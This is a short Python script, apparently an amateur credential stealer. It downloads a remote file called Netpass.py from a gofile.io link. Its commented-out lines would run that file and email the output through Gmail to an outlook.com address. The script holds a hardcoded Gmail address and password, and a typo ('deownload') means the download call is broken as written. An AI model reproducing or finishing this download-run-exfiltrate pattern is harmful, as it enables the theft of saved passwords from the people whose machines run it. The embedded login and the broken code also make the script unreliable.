import subprocess 
import wget
import smtplib

def Downloader(url) :
    wget.deownload(url)
def EmailSender(From_Email , Sender , Message ):
    # Here we are are specifying Email Server
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    # Here we are loging to the Email sever
    server.login('mbxtest5003@gmail.com', "Tailor_5004")
    # here we are sending Email
    server.sendmail(From_Email,Sender,Message)
    #server.sendmail( "from@address.com","Mr_MBX-217@outlook.com",)


#output = subprocess.check_output("python Netpass")
#EmailSender("from@address.com" , "Mr_MBX-217@outlook.com" ,  )
#Downloader("https://srv-store1.gofile.io/download/b8drUF/51e6da73e989bd08b45d9b4297ae0d92/Netpass.py" , "NetPass.py")
Downloader("https://srv-store1.gofile.io/download/b8drUF/51e6da73e989bd08b45d9b4297ae0d92/Netpass.py" )
